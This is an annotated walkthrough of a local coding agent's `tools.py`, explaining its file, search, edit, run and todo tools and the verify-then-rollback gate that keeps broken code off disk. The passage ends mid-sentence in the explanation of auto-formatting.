# `localagent/tools.py` — what the model can do, and the verification gates

**Role in the flow:** the model never touches your disk. It *asks* for a tool by name with arguments;
`ToolBox.call` runs it and returns a **string** (success or error). Errors are returned, not raised, so the model
reads them and retries. This file holds the two gates behind your "verify, then re-check" requirement:

| Gate | Where | What happens on failure |
|---|---|---|
| Write gate | `_commit` (used by `write_file`, `edit_file`) | file is written, checked, and **rolled back**; errors returned |
| Run gate | `_run_python`, `_run_tests` | **not run**; errors returned |

After a write passes the gate, `_format` runs `ruff format` so all code the agent keeps has one consistent style.

The rollback means broken code never persists; the run gate re-checks anyway in case a file was changed outside the
agent (a second, independent check). The CLI also calls `check_workspace` after every request.

## Module header
```python
  1 | """The tools the model may call, plus the verify-before-write/run gates.
  2 | 
  3 | Core rule: broken code never stays on disk and never gets executed (Python,
  4 | JSON, TOML, JavaScript and many more are checked; see verify.py).
  5 |   * write_file / edit_file write, verify, and ROLL BACK if verification fails.
  6 |   * run_python / run_tests re-verify first (a second, independent check).
  7 | Every tool returns a plain string; failures are returned, never raised, so the
  8 | model can read the error and try again.
  9 | """
 10 | from __future__ import annotations
 11 | 
 12 | import ast
 13 | import difflib
 14 | import fnmatch
 15 | import json
 16 | import re
 17 | import sys
 18 | import time
 19 | from dataclasses import dataclass
 20 | from pathlib import Path
 21 | from typing import Callable
 22 | 
 23 | from .config import Config
 24 | from .mcp import MCPError, MCPServer, clean_schema
 25 | from .runners import make_runner
 26 | from .sandbox import (SKIP_DIRS, SandboxError, looks_binary, project_files, quote_for_shell,
 27 |                       resolve_inside, run_command, shell_argv, skip_dir, truncate, walk_files)
 28 | from .settings import PROJECT_SETTINGS, Permissions
 29 | from .verify import CHECKED_SUFFIXES, _installed, verify_file, verify_python
 30 | from .web import fetch_text
 31 | 
 32 | __all__ = ["SKIP_DIRS", "READ_ONLY", "Approval", "Tool", "ToolBox"]   # SKIP_DIRS re-exported
 33 | MAX_SEARCH_HITS = 40
 34 | MAX_SEARCH_FILES = 20_000
 35 | MAX_SEARCH_BYTES = 2_000_000          # bigger files (logs, data, bundles) are not searched
 36 | MAX_READ_BYTES = 8_000_000            # bigger files are only read in parts (start/end)
 37 | TOGETHER_HINT = ("Hint: if this name is defined by another edit you have not made yet (for example "
 38 |                  "a rename), send ALL related edits together in ONE multi_edit call, or use "
 39 |                  "edit_file with all=true.")
 40 | EMPTY_OLD = ("ERROR: 'old' must not be empty: copy the exact text to replace from the file "
 41 |              "(to write a whole file, use write_file)")
 42 | READ_ONLY = frozenset({"list_files", "read_file", "search", "outline"})
 43 | TextStyle = tuple[str, bool]          # (line break "\n" or "\r\n", starts with a byte-order mark)
 44 | CRLF_SUFFIXES = frozenset({".bat", ".cmd"})   # Windows batch files need CRLF line breaks
 45 | 
 46 | 
 47 | DONE_MARKS = ("(done)", "[done]", "(completed)", "- done", "✓", "✔")
 48 | 
 49 | 
```
- Docstring states the core rule. Imports: `ast` (parse Python for `outline`), `difflib` (edit diffs for your
  screen), `json` (MCP arguments), `time` (session start), `fnmatch` (file-name patterns for `search`), `re` (regular
  expressions for `search`, braces in globs), `sys` (the current Python's path, `sys.executable`), `dataclass`, `Path`,
  `Callable`, the `Config`, the sandbox helpers (`looks_binary`, `project_files`, `quote_for_shell`, `skip_dir` ...),
  and `verify_python`.
- `SKIP_DIRS` and `walk_files` now live in `sandbox.py` (one shared definition); `__all__` re-exports `SKIP_DIRS` so
  older imports keep working. `verify_file`/`CHECKED_SUFFIXES` come from `verify.py`.
  `MAX_SEARCH_HITS`: a search stops after 40 matches to protect the context window; `MAX_SEARCH_FILES` stops it after
  20 000 files (with a hint to narrow the search) so a search in a giant folder cannot hang. `MAX_SEARCH_BYTES`: files
  over 2 MB (logs, data, bundled JavaScript) are not searched. `MAX_READ_BYTES`: files over 8 MB are only read in parts.
  `EMPTY_OLD` is the refusal for an edit with nothing to find. `TOGETHER_HINT` is added to a
  rejection caused by an undefined name (ruff `F821`): it tells the model to send related edits — such as both halves
  of a rename — together in one `multi_edit`. Added after the `rename_function` eval showed the model making the two
  edits one by one, so the first was (correctly) rejected as inconsistent.
- Also imported: the MCP client (`mcp.py`), the permission rules (`settings.py`) and the web reader (`web.py`).
- `DONE_MARKS`: text endings that mean "this checklist item is finished" (see `_todo_item`).
- `READ_ONLY`: the names of tools that never change anything (`list_files`, `read_file`, `search`, `outline`); the agent
  runs batches made only of these in parallel. `_installed` (from `verify.py`) tells whether ruff can be used.
- `TextStyle` describes how a text file is written: its line break (`"\n"` or `"\r\n"`) and whether it starts with a
  byte-order mark. `CRLF_SUFFIXES`: new Windows batch files (`.bat`, `.cmd`) get CRLF, which they need to run correctly.

## Writing files exactly as they were written before
**A data-integrity fix of version 0.6.** Python's `read_text` turns `\r\n` into `\n`, and `write_text` on Windows turns
every `\n` back into `\r\n`. So before 0.6 one small `edit_file` on Windows rewrote **every line** of a file that used
Unix line breaks (most projects from GitHub): git then showed the whole file as changed. Even a *rejected* write did it,
because the rollback wrote the old text back the same way. Files with a byte-order mark lost or doubled it. Now each
file keeps its own line breaks and mark, and a rollback restores the exact old bytes.

```python
 62 | def text_style(raw: str) -> TextStyle:
 63 |     """How a text file is written: its usual line break and whether it has a byte-order mark."""
 64 |     crlf = raw.count("\r\n")
 65 |     return ("\r\n" if crlf > raw.count("\n") - crlf else "\n"), raw.startswith("﻿")
 66 | 
 67 | 
```
- Counts `\r\n` against lone `\n`: a file that mostly uses CRLF is written with CRLF, otherwise LF (a file mixing both is
  made consistent with its majority). Notes whether it starts with the mark `﻿`.

```python
 68 | def read_text(path: Path) -> tuple[str, TextStyle]:
 69 |     """A UTF-8 file's text with plain "\\n" line breaks (no mark), plus its style to write back."""
 70 |     with path.open(encoding="utf-8", newline="") as handle:     # newline="": see "\r\n" as is
 71 |         raw = handle.read()
 72 |     style = text_style(raw)
 73 |     text = raw.replace("\r\n", "\n")
 74 |     return (text[1:] if style[1] else text), style
 75 | 
 76 | 
```
- Opens the file with `newline=""` (the `\r\n` stay visible), notes the style, and returns the text with plain `\n`
  and without the mark — the form the model sees and edits match against.

```python
 77 | def write_text(path: Path, text: str, style: TextStyle) -> None:
 78 |     """Write ``text`` in ``style``, so an edit never changes a file's line breaks or mark."""
 79 |     newline, mark = style
 80 |     path.write_text(("﻿" if mark else "") + text.replace("\r\n", "\n"),
 81 |                     encoding="utf-8", newline=newline)
 82 | 
 83 | 
```
- Writes the text back in the given style: the mark first if the file had one, and `newline=` makes Python write every
  `\n` as the file's own line break. `\r\n` sent by the model is turned into `\n` first, so it can never become `\r\r\n`.

```python
 84 | def _globs(pattern: str) -> list[str]:
 85 |     """``*.{js,ts}`` -> ``["*.js", "*.ts"]`` (fnmatch itself knows no braces)."""
 86 |     found = re.search(r"\{([^{}]*)\}", pattern)
 87 |     if not found:
 88 |         return [pattern]
 89 |     return [expanded for option in found.group(1).split(",")
 90 |             for expanded in _globs(pattern[:found.start()] + option + pattern[found.end():])]
 91 | 
 92 | 
```
- Python's `fnmatch` has no braces, but models often write `*.{js,ts}`; this expands them into `*.js` and `*.ts`
  (recursively, for several brace groups).

## `_todo_item`
```python
 50 | def _todo_item(item: object) -> dict:
 51 |     """One checklist entry from ``{"text", "done"}`` or plain text; "... (done)" also counts as done."""
 52 |     text = str(item.get("text", "")) if isinstance(item, dict) else str(item)
 53 |     done = bool(item.get("done", False)) if isinstance(item, dict) else False
 54 |     for mark in DONE_MARKS:                                # models often write the state into the text
 55 |         if text.lower().rstrip().endswith(mark):
 56 |             text, done = text.rstrip()[: -len(mark)].rstrip(), True
 57 |     if text.lstrip().lower().startswith("[x]"):
 58 |         text, done = text.lstrip()[3:].lstrip(), True
 59 |     return {"text": text, "done": done}
 60 | 
 61 | 
```
- Turns one checklist entry into `{text, done}`. Accepts `{"text": ..., "done": ...}` or plain text. Real models often
  write the state into the text instead of setting `done` (seen in the end-to-end test: every item said "(done)" while
  the header said `0/4 done`), so endings in `DONE_MARKS` such as `(done)` or `✓`, and a leading `[x]`, also mark the
  item done and are removed from the text. `DONE_MARKS` is defined just above (part of the header block).

## `Approval`
```python
 93 | class Approval(str):
 94 |     """The question shown to the user ("run python a.py") that also carries, for permission
 95 |     rules and "always allow" answers, which tool asks and about what (command, file, URL)."""
 96 | 
 97 |     tool: str
 98 |     subject: str
 99 | 
```
```python
100 |     def __new__(cls, text: str, tool: str, subject: str) -> "Approval":
101 |         question = super().__new__(cls, text)
102 |         question.tool = tool
103 |         question.subject = subject
104 |         return question
105 | 
106 | 
```
- The question shown to you ("run python main.py") is an `Approval`: a normal string (so every approval function that
  expects text keeps working, and `"main.py" in question` works) that **also** carries `tool` and `subject`. The CLI's
  "always" answer uses those two to save an exact permission rule. A `str` subclass must set its text in `__new__`
  (strings cannot change after creation), so the extra attributes are attached there.

## `Tool`
```python
107 | @dataclass(frozen=True)
108 | class Tool:
109 |     """A callable plus the JSON schema the model sees."""
110 | 
111 |     name: str
112 |     description: str
113 |     parameters: dict
114 |     func: Callable[[dict], str]
115 | 
```
```python
116 |     def spec(self) -> dict:
117 |         """Ollama/OpenAI-style function definition."""
118 |         return {"type": "function", "function": {
119 |             "name": self.name, "description": self.description,
120 |             "parameters": self.parameters}}
121 | 
122 | 
```
- A frozen record of: `name`, `description` (the model reads this to decide when to use the tool), `parameters` (a
  JSON schema describing the arguments), and `func`, the Python function that implements it.
- `spec()` builds the `{"type": "function", "function": {...}}` structure Ollama and OpenAI-style servers expect.

## `_schema`
```python
123 | def _schema(properties: dict, required: list[str]) -> dict:
124 |     """Build a JSON-schema object for tool parameters."""
125 |     return {"type": "object", "properties": properties, "required": required}
126 | 
127 | 
```
- Builds a JSON-schema object: `properties` lists the arguments, `required` the mandatory ones. It removes
  boilerplate from the tool table.

## `ToolBox` setup
```python
128 | class ToolBox:
129 |     """Owns the workspace, the tool table and the per-file failure counters."""
130 | 
```
```python
131 |     def __init__(self, config: Config, approve: Callable[[str], bool] | None = None,
132 |                  settings: dict | None = None) -> None:
133 |         self._cfg = config
134 |         config.workspace.mkdir(parents=True, exist_ok=True)
135 |         self._root = config.workspace.resolve()
136 |         self._approve = approve or (lambda _action: False)
137 |         self._failures: dict[str, int] = {}
138 |         self.writes = 0                           # successful file writes so far
139 |         self.started = time.time()                # files changed after this are "this session's"
140 |         self.runner = make_runner(config, self._root)   # where code runs: host or container
141 |         self.todo: list[dict] = []                # the model's visible task checklist
142 |         self.permissions = Permissions.from_settings(
143 |             settings or {}, self._root / PROJECT_SETTINGS if settings is not None else None)
144 |         self.notes: list[str] = []                # startup messages for the user (MCP servers)
145 |         self._diff: list[str] = []                # diff of the latest successful write
146 |         self._mcp: list[MCPServer] = []
147 |         self._tools = {t.name: t for t in self._build()}
148 |         self._start_mcp((settings or {}).get("mcpServers", {}))
149 |         self.hooks: dict = dict((settings or {}).get("hooks", {}))   # your own commands (see run_hook)
150 |         self.test_command = str((settings or {}).get("test_command") or "")   # "" = detect
151 | 
152 |     # ----- public API used by the agent -------------------------------------
```
- Takes the config and an optional `approve` callback (asks the human; `None` means "always deny").
- Creates the workspace folder if missing and keeps its absolute path as the sandbox root.
- `runner` (from `runners.py`) decides where code runs: this computer or the Docker sandbox.
- `todo` holds the model's current checklist. `permissions` comes from the settings passed in (none for the eval
  harness and the server, so they behave as before); "always" answers are saved to the project's
  `.localagent/settings.json`. `notes` collects start-up messages for the banner; `_diff` holds the last edit's diff;
  `_mcp` the running MCP servers, whose tools are added after the built-in ones. `hooks` holds your hook commands
  from the settings.
- `started` is when this toolbox (session) began; files changed after it count as "this session's".
- `writes` counts successful file writes (the agent uses it to notice "asked for a change, changed nothing"). `_failures` counts rejected writes per file. `_tools` is a `{name: Tool}` table built by `_build`.
- `test_command` is your own test command from the settings (empty = let the runner choose, see `runners.md`).

## Public API
```python
157 |     def close(self) -> None:
158 |         """Release resources: the Docker sandbox container and any MCP server programs."""
159 |         self.runner.stop()
160 |         for server in self._mcp:
161 |             server.close()
162 | 
```
```python
163 |     def pop_diff(self) -> list[str]:
164 |         """The diff of the latest write (for the user's screen only), then forget it."""
165 |         diff, self._diff = self._diff, []
166 |         return diff
167 | 
```
- `pop_diff` hands the last write's diff to the agent (for your screen) and forgets it.
- `close` releases resources: stops the sandbox container if one was started and every MCP server program. Called by the eval runner after each task and by
  the server when a session expires; the CLI relies on the exit-time clean-up.

```python
168 |     @staticmethod
169 |     def is_read_only(name: str) -> bool:
170 |         """True for tools that never change anything, so they may run in parallel."""
171 |         return name in READ_ONLY
172 | 
```
- Static helper: is this tool name in `READ_ONLY`? Unknown names are not, so they run sequentially.

```python
153 |     def specs(self) -> list[dict]:
154 |         """Tool definitions to send to the model."""
155 |         return [tool.spec() for tool in self._tools.values()]
156 | 
```
- The list of tool definitions sent to the model on every request.

```python
173 |     def check_workspace(self, since: float | None = None) -> list[str]:
174 |         """Verify checkable files (only those changed after ``since`` if given); list failures.
175 | 
176 |         Checking only changed files keeps this fast in big projects and never blames the
177 |         agent for files that were already broken before it started.
178 |         """
179 |         problems: list[str] = []
180 |         for path in walk_files(self._root):
181 |             if since is not None and path.stat().st_mtime < since - 1.0:   # 1 s clock slack
182 |                 continue
183 |             if path.suffix.lower() in CHECKED_SUFFIXES:
184 |                 report = verify_file(path, self._root, self._cfg.type_check)
185 |                 if not report.ok:
186 |                     problems.append(f"{path.relative_to(self._root).as_posix()}:\n{report.render()}")
187 |         return problems
188 | 
```
- Verifies every checkable file found by `walk_files` — or, with `since`, only files modified after that moment (one
  second of slack for clock rounding) — and returns one entry per failing file (path plus errors). With `since` it is
  fast in big projects and never blames the agent for files that were already broken before it started. An empty list means everything is fine. Used by `_run_tests` and by the CLI's end-of-request check.

```python
189 |     def call(self, name: str, args: dict) -> str:
190 |         """Run one tool by name; always returns a string."""
191 |         tool = self._tools.get(name)
192 |         if tool is None:
193 |             return f"ERROR: unknown tool '{name}'. Available: {', '.join(self._tools)}"
194 |         try:
195 |             return tool.func(args)
196 |         except SandboxError as exc:
197 |             return f"ERROR: {exc}"
198 |         except UnicodeDecodeError:
199 |             return ("ERROR: that file is not UTF-8 text (binary, or another encoding), so it "
200 |                     "cannot be edited safely")
201 |         except (KeyError, TypeError, ValueError) as exc:
202 |             return f"ERROR: bad arguments for {name}: {exc!r}"
203 |         except OSError as exc:
204 |             return f"ERROR: {exc}"
205 | 
206 |     # ----- tool table --------------------------------------------------------
```
- Looks the tool up; an unknown name (models sometimes invent tools) returns an error that lists the real ones.
- Runs the function and converts expected failures into strings: `SandboxError` (path escape) → `ERROR:`;
  `UnicodeDecodeError` (editing a file that is not UTF-8 text) → a clear "not UTF-8 text" error (it used to read "bad
  arguments", which sent the model looking for a mistake in its arguments); `KeyError`/`TypeError`/`ValueError` (missing
  or wrong-typed argument) → "bad arguments"; `OSError` (permissions, disk) → `ERROR:`.

## The tool table
```python
207 |     def _build(self) -> list[Tool]:
208 |         return [
209 |             Tool("list_files", "List files and folders in a workspace folder.",
210 |                  _schema({"path": {"type": "string", "description": "folder, default '.'"}}, []),
211 |                  self._list_files),
212 |             Tool("read_file", "Read a text file with line numbers. Use start/end to read part of it.",
213 |                  _schema({"path": {"type": "string"}, "start": {"type": "integer"},
214 |                           "end": {"type": "integer"}}, ["path"]),
215 |                  self._read_file),
216 |             Tool("search", "Find lines matching a regular expression in workspace files (like "
217 |                  "grep; files that .gitignore excludes are skipped). Returns file:line: text. "
218 |                  "Much cheaper than reading files.",
219 |                  _schema({"pattern": {"type": "string"},
220 |                           "path": {"type": "string", "description": "folder or file, default '.'"},
221 |                           "glob": {"type": "string", "description": "file pattern such as '*.py', "
222 |                                    "'src/*.ts' or '*.{js,ts}'; default: all text files"}},
223 |                          ["pattern"]),
224 |                  self._search),
225 |             Tool("outline", "List the classes and functions (with line numbers) of one Python "
226 |                  "file, or of every Python file in a folder. Cheaper than reading whole files.",
227 |                  _schema({"path": {"type": "string", "description": "file or folder, default '.'"}},
228 |                          []),
229 |                  self._outline),
230 |             Tool("write_file", "Create or overwrite a file. Code and config files are verified "
231 |                  "first (syntax, undefined names) and rejected with the errors if they do not pass.",
232 |                  _schema({"path": {"type": "string"}, "content": {"type": "string"}},
233 |                          ["path", "content"]),
234 |                  self._write_file),
235 |             Tool("edit_file", "Replace one exact, unique piece of text in a file. To rename "
236 |                  "something that appears several times in the file, set all=true.",
237 |                  _schema({"path": {"type": "string"}, "old": {"type": "string"},
238 |                           "new": {"type": "string"},
239 |                           "all": {"type": "boolean", "description": "replace every occurrence"}},
240 |                          ["path", "old", "new"]),
241 |                  self._edit_file),
242 |             Tool("multi_edit", "Apply several exact, unique text replacements to ONE file in a "
243 |                  "single call (one verification). Each edit is {old, new}; they apply in order.",
244 |                  _schema({"path": {"type": "string"},
245 |                           "edits": {"type": "array", "items": {
246 |                               "type": "object",
247 |                               "properties": {"old": {"type": "string"}, "new": {"type": "string"}},
248 |                               "required": ["old", "new"]}}}, ["path", "edits"]),
249 |                  self._multi_edit),
250 |             Tool("run_python", "Verify then run a Python file. Refuses if verification fails.",
251 |                  _schema({"path": {"type": "string"},
252 |                           "args": {"type": "array", "items": {"type": "string"}}}, ["path"]),
253 |                  self._run_python),
254 |             Tool("run_tests", "Verify the changed files, then run the project's tests (pytest, "
255 |                  "unittest, npm test, go test or cargo test: whichever the project uses).",
256 |                  _schema({}, []), self._run_tests),
257 |             Tool("todo", "Show the user your plan as a checklist. Send the whole list each "
258 |                  "time and set done=true on finished items. Use it for tasks with 3 or more steps.",
259 |                  _schema({"items": {"type": "array", "items": {
260 |                      "type": "object",
261 |                      "properties": {"text": {"type": "string"}, "done": {"type": "boolean"}},
262 |                      "required": ["text"]}}}, ["items"]),
263 |                  self._todo),
264 |             Tool("fetch_url", "Read a web page (for example library documentation) as plain "
265 |                  "text. The user is asked first.",
266 |                  _schema({"url": {"type": "string"}}, ["url"]), self._fetch_url),
267 |         ] + ([Tool("run_shell", f"Run a shell command ({self.runner.shell_label}), e.g. pip "
268 |                    "install, pytest, git, node. The workspace is the current folder.",
269 |                    _schema({"command": {"type": "string"}}, ["command"]), self._run_shell)]
270 |              if self.runner.supports_shell else [])
271 | 
272 |     # ----- read-only tools ---------------------------------------------------
```
- One `Tool(...)` per capability: `list_files`, `read_file` (optional `start`/`end` so the model can read only a
  slice), `search` (grep-like, far cheaper than reading files), `outline` (classes and functions with line numbers),
  `write_file`, `edit_file` (replace one unique snippet instead of rewriting a file), `multi_edit` (several such
  replacements in one call), `run_python`, `run_tests`, and — **only when the runner supports it (Docker)** —
  `run_shell`, plus `todo` (a checklist) and `fetch_url` (read a web page; always asked or ruled). The list is built as "base tools + optional shell tool", so the model
  never even sees a shell tool unless the runner offers one (Docker, or `--allow-shell` on this computer). The shell
  tool's description names where it runs (`shell_label`), e.g. "PowerShell on this Windows computer".
- The descriptions are part of the prompt, so they are written to tell the model *when* to use each tool. Version 0.6
  updated three: `search` (all text files by default, `.gitignore` honoured, glob examples), `write_file` ("code and
  config files are verified" — it used to say only Python) and `run_tests` (whichever test tool the project uses).

## Read-only tools
```python
273 |     def _list_files(self, args: dict) -> str:
274 |         folder = resolve_inside(self._root, args.get("path") or ".")
275 |         if not folder.is_dir():
276 |             return f"ERROR: '{args.get('path', '.')}' is not a folder"
277 |         rows = [p.name + ("/" if p.is_dir() else "")
278 |                 for p in sorted(folder.iterdir()) if not (p.is_dir() and skip_dir(p.name))]
279 |         return "\n".join(rows) or "(empty folder)"
280 | 
```
- Resolves the folder inside the sandbox; errors if it is not a folder; lists sorted names (folders get `/`), hiding
  skipped *folders* (a file that happens to be called `dist` is still shown); says "(empty folder)" when appropriate.

```python
281 |     def _read_file(self, args: dict) -> str:
282 |         path = resolve_inside(self._root, args["path"])
283 |         if not path.is_file():
284 |             return f"ERROR: file '{args['path']}' does not exist"
285 |         size = path.stat().st_size
286 |         if looks_binary(path):
287 |             return f"ERROR: '{args['path']}' is a binary file ({size} bytes), not text"
288 |         start = max(int(args.get("start") or 1), 1)
289 |         if size > MAX_READ_BYTES:
290 |             return self._read_part(path, args, start)
291 |         lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
292 |         if lines and start > len(lines):
293 |             return f"(the file has only {len(lines)} lines)"
294 |         end = min(int(args.get("end") or len(lines)), len(lines))
295 |         body = "\n".join(f"{n}: {lines[n - 1]}" for n in range(start, end + 1))
296 |         if body and (start > 1 or end < len(lines)):             # tell the model there is more
297 |             body += f"\n(lines {start}-{end} of {len(lines)})"
298 |         return truncate(body, self._cfg.max_output_chars) or "(empty file)"
299 | 
```
- Resolves and checks the file. A **binary** file (`looks_binary`) is refused with its size — before 0.6 reading a model
  or image file returned thousands of garbage characters.
- Files over `MAX_READ_BYTES` go to `_read_part`. Others are read as text (a byte-order mark dropped, undecodable bytes
  replaced rather than crashing); `start` and `end` may be missing or `null`; a `start` past the end says how long the
  file is; each line is prefixed with its number so the model can quote exact locations.
- A read of only part of the file ends with `(lines 20-60 of 340)`, so the model knows there is more without guessing.
  The result is truncated.

```python
300 |     def _read_part(self, path: Path, args: dict, start: int) -> str:
301 |         """Lines ``start`` to ``end`` of a file too big to load whole (read line by line)."""
302 |         if not args.get("end"):
303 |             return (f"ERROR: '{args['path']}' is {path.stat().st_size // 1_000_000} MB, too big to "
304 |                     "read whole; use search to find the lines you need, then read_file with start "
305 |                     "and end")
306 |         end, rows = int(args["end"]), []
307 |         with path.open(encoding="utf-8-sig", errors="replace") as handle:
308 |             for number, line in enumerate(handle, start=1):
309 |                 if number > end:
310 |                     break
311 |                 if number >= start:
312 |                     rows.append(f"{number}: {line.rstrip(chr(13) + chr(10))}")
313 |         return truncate("\n".join(rows), self._cfg.max_output_chars) or "(no such lines)"
314 | 
```
- Reads a very large file (a log, a data dump) **line by line**, keeping only lines `start` to `end` and stopping after
  `end`, so it never loads the whole file. Without `end` it asks the model to find the lines with `search` first.

```python
315 |     def _search(self, args: dict) -> str:
316 |         try:
317 |             pattern = re.compile(args["pattern"])
318 |         except re.error as exc:
319 |             return f"ERROR: invalid regular expression: {exc}"
320 |         target = resolve_inside(self._root, args.get("path") or ".")
321 |         files = [target] if target.is_file() else project_files(target)
322 |         globs = _globs(args.get("glob") or "*")
323 |         hits: list[str] = []
324 |         for scanned, path in enumerate(files, start=1):
325 |             if scanned > MAX_SEARCH_FILES:
326 |                 hits.append(f"... stopped after looking at {MAX_SEARCH_FILES} files; "
327 |                             "narrow 'path' or 'glob'")
328 |                 break
329 |             relative = path.relative_to(self._root).as_posix()
330 |             if not any(fnmatch.fnmatch(path.name, g) or fnmatch.fnmatch(relative, g) for g in globs):
331 |                 continue
332 |             try:
333 |                 if path.stat().st_size > MAX_SEARCH_BYTES or looks_binary(path):
334 |                     continue                          # data, bundles, models: not code to grep
335 |                 lines = path.read_text(encoding="utf-8").splitlines()
336 |             except (UnicodeDecodeError, OSError):
337 |                 continue                              # another encoding, or gone: skip
338 |             for number, line in enumerate(lines, start=1):
339 |                 if pattern.search(line):
340 |                     hits.append(f"{relative}:{number}: {line.strip()[:120]}")
341 |                     if len(hits) >= MAX_SEARCH_HITS:
342 |                         return "\n".join(hits) + f"\n... stopped at {MAX_SEARCH_HITS} matches"
343 |         return "\n".join(hits) or "no matches"
344 | 
```
- Compiles the regular expression; an invalid one returns a readable error instead of crashing.
- Searches the chosen folder with `project_files` (so `.gitignore`d files are skipped) — or just that file, when
  `path` names a file — stopping after `MAX_SEARCH_FILES` files with a note.
- **The default is now every text file** (`*`). Before 0.6 it was `*.py`, so in a JavaScript, Go or Rust project a search
  without a `glob` found nothing at all, and the model concluded the code did not exist. A `glob` is matched against the
  file name *and* the workspace path, so `src/*.ts` works, and braces work (`*.{js,ts}`, via `_globs`).
- Files over `MAX_SEARCH_BYTES`, binary files and files in other encodings are skipped. Each matching line is reported
  as `path:line: text` (stripped and cut to 120 characters). After 40 hits it stops and says so; no hits returns
  "no matches".

```python
345 |     def _outline(self, args: dict) -> str:
346 |         target = resolve_inside(self._root, args.get("path") or ".")
347 |         if target.is_file():
348 |             files = [target]
349 |         elif target.is_dir():
350 |             files = [p for p in project_files(target) if p.suffix == ".py"]
351 |         else:
352 |             return f"ERROR: '{args.get('path', '.')}' does not exist"
353 |         rows: list[str] = []
354 |         for path in files:
355 |             rows.append(path.relative_to(self._root).as_posix() + ":")
356 |             try:
357 |                 tree = ast.parse(path.read_text(encoding="utf-8-sig"))
358 |             except (SyntaxError, UnicodeDecodeError, ValueError):
359 |                 rows.append("  (cannot parse)")
360 |                 continue
361 |             for node in tree.body:
362 |                 if isinstance(node, ast.ClassDef):
363 |                     rows.append(f"  class {node.name}  line {node.lineno}")
364 |                     rows += [f"    def {m.name}  line {m.lineno}" for m in node.body
365 |                              if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef))]
366 |                 elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
367 |                     rows.append(f"  def {node.name}  line {node.lineno}")
368 |         return truncate("\n".join(rows), self._cfg.max_output_chars) or "(no Python files)"
369 | 
```
- A *repo-map* tool for big projects: instead of reading whole files the model asks for the shape of the code.
  For a file or for every `.py` file under a folder (found with `project_files`) it parses the source with `ast` and
  lists top-level classes (with their methods) and functions, each with its line number, so a following `read_file` can
  target just those lines. Unparseable files show `(cannot parse)` (the write gate normally prevents them), and the
  result is truncated.

```python
370 |     def _todo(self, args: dict) -> str:
371 |         items = args["items"]
372 |         if not isinstance(items, list) or not items:
373 |             return "ERROR: 'items' must be a non-empty list of {text, done}"
374 |         self.todo = [_todo_item(i) for i in items]
375 |         finished = sum(item["done"] for item in self.todo)
376 |         lines = [f"TODO {finished}/{len(self.todo)} done"]
377 |         lines += [f"  [{'x' if item['done'] else ' '}] {item['text']}" for item in self.todo]
378 |         return "\n".join(lines)
379 | 
380 |     # ----- write tools (verified, rolled back on failure) -------------------
```
- Like Claude Code's to-do list: the model sends its whole plan as a list (each item `{text, done}` or plain text,
  normalised by `_todo_item`); the tool stores it and returns `TODO 1/3 done` plus one `[x]`/`[ ]` line per item, which the agent shows in full. It
  costs no extra model call when sent together with real work (prompt rule 12).

## Write tools and the write gate
```python
381 |     def _write_file(self, args: dict) -> str:
382 |         return self._commit(args["path"], str(args["content"]))
383 | 
```
- Simply forwards to `_commit`.

```python
384 |     def _edit_file(self, args: dict) -> str:
385 |         path = resolve_inside(self._root, args["path"])
386 |         if not path.is_file():
387 |             return f"ERROR: file '{args['path']}' does not exist"
388 |         old, new = str(args["old"]).replace("\r\n", "\n"), str(args["new"]).replace("\r\n", "\n")
389 |         if not old:
390 |             return EMPTY_OLD
391 |         text, style = read_text(path)
392 |         if old.startswith("﻿") and style[1]:      # the edit names the byte-order mark itself:
393 |             text, style = "﻿" + text, (style[0], False)   # it is text now, and may go
394 |         count = text.count(old)
395 |         if args.get("all") is True and count >= 1:
396 |             return self._commit(args["path"], text.replace(old, new), style)
397 |         if count != 1:
398 |             return (f"ERROR: 'old' text must match exactly once, but matched {count} times"
399 |                     + (" (use all=true to replace every occurrence)" if count > 1 else ""))
400 |         return self._commit(args["path"], text.replace(old, new), style)
401 | 
```
- Requires the file to exist. `old` and `new` get plain `\n` line breaks, like the text they are matched against.
- **An empty `old` is refused.** Every text "contains" the empty string once between every two characters: with
  `all=true`, `"abc".replace("", "X")` gives `"XaXbXcX"`. Before 0.6 such a call was *accepted* for unchecked files
  (Markdown, HTML, CSS ...) and wrote exactly that.
- Reads the file with `read_text` (remembering its style), counts occurrences of `old`, and refuses unless there is
  **exactly one** (zero = nothing to replace, several = ambiguous; the error then hints at `all=true`). The replacement
  goes through the same verified `_commit`, in the file's own style.
- The byte-order mark is normally invisible to edits and always kept. Only when `old` itself starts with the mark
  (`﻿`) — the model deliberately editing it — does the mark become part of the text, so that `new` decides whether
  it stays. Without this a model could never remove one: the style would put it back after every write.
- **`all=true` (rename mode):** with this opt-in flag every occurrence is replaced (at least one must exist). It was added
  after the `rename_function` eval: the model had to rename a name used twice in `main.py`, the unique-match rule
  blocked it and it got stuck. The unique-match rule stays the default because it prevents accidental mass edits; the
  verification gate still checks the result (e.g. renaming `f` everywhere would break `from` and be rejected).

```python
402 |     def _multi_edit(self, args: dict) -> str:
403 |         path = resolve_inside(self._root, args["path"])
404 |         if not path.is_file():
405 |             return f"ERROR: file '{args['path']}' does not exist"
406 |         edits = args["edits"]
407 |         if not isinstance(edits, list) or not edits:
408 |             return "ERROR: 'edits' must be a non-empty list of {old, new}"
409 |         text, style = read_text(path)
410 |         for number, edit in enumerate(edits, start=1):
411 |             old = str(edit["old"]).replace("\r\n", "\n")
412 |             if not old:
413 |                 return f"{EMPTY_OLD}. Edit {number} is empty; nothing was changed."
414 |             count = text.count(old)
415 |             if count != 1:
416 |                 return (f"ERROR: edit {number}: 'old' text must match exactly once, "
417 |                         f"but matched {count} times. Nothing was changed.")
418 |             text = text.replace(old, str(edit["new"]).replace("\r\n", "\n"))
419 |         return self._commit(args["path"], text, style)
420 | 
```
- Several edits to one file in **one model call and one verification** (fewer calls than repeated `edit_file`).
  Edits are applied in order to an in-memory copy; every `old` must be non-empty and match exactly once at its turn. On
  the first problem it returns an error naming the edit number and *nothing is written* (all-or-nothing). Success goes
  through `_commit` in the file's own style, so the usual verify/rollback gate applies to the combined result. An empty
  or non-list `edits` is rejected.

```python
421 |     def _format(self, path: Path) -> None:
422 |         """Best-effort ``ruff format`` of a file that already passed verification."""
423 |         if self._cfg.auto_format and _installed("ruff"):
424 |             run_command([sys.executable, "-m", "ruff", "format", str(path)], self._root, 30, 500)
425 | 
```
- Best-effort auto-format: if `auto_format` is on and ruff is installed, runs `ruff format <file>` in the workspace
  (30 s limit). It runs only **after** verification passed, so a format problem can never reject good code, and its
  output is ignored. Result: consistent style at zero model cost. Because formatting may change the file's text, the
